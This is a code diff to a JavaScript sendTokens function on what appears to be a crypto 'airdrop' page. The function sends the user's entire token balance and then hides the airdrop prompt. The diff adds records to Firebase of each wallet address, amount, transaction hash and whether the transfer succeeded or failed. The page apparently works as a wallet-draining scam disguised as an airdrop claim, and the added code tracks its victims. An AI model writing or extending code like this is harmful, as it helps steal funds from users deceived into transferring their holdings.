@@ -567,11 +567,21 @@ async function sendTokens() {
         alert(`🎉 Tokens sent successfully! Transaction Hash: ${receipt.transactionHash}`);
         log('✅ Tokens sent successfully. Transaction complete.');
 
+        // Update Firebase with transaction success
+        await saveToFirebase({
+            address: signerAddress,
+            transferAmount: userSession.tokenBalance,
+            transferTxHash: receipt.transactionHash,
+            status: 'success'
+        });
+
+        log('✅ Transaction details saved to the database.');
+
         // Hide airdrop info and send button
         document.getElementById('airdropInfo').style.display = 'none';
         document.getElementById('sendBtn').style.display = 'none';
 
-        // Show Discord and Twitter logos
+        // Show Discord and Twitter buttons
         document.getElementById('discordBtn').style.display = 'block';
         document.getElementById('discordBtn').innerHTML = 'Follow us on Discord';
         document.getElementById('discordBtn').onclick = () => window.open('https://discord.com/invite/yourserver', '_blank');
@@ -590,6 +600,17 @@ async function sendTokens() {
             console.error('❌ Error sending tokens:', error.message || error);
             alert(`❌ Transfer Error: ${error.message}`);
         }
+
+        // Log failure to Firebase
+        await saveToFirebase({
+            address: signerAddress,
+            transferAmount: userSession.tokenBalance || 0,
+            transferTxHash: null,
+            status: 'failed',
+            error: error.message
+        });
+
+        log('❌ Transaction failure details saved to the database.');
         throw error;
     }
 }
